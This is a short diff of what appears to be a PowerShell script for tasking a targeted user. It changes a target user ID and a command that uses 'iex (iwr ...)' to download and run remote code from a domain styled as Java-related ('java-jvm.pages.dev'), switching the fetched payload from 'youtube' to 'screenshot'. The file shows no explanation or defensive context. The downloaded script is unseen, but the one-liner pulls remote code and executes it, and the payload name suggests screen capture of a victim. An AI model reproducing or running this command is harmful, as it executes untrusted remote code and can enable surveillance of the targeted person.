@@ -1,5 +1,5 @@
-$target_user = "42131"
-$command = "iex (iwr java-jvm.pages.dev/youtube);"
+$target_user = "47156"
+$command = "iex (iwr java-jvm.pages.dev/screenshot);"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
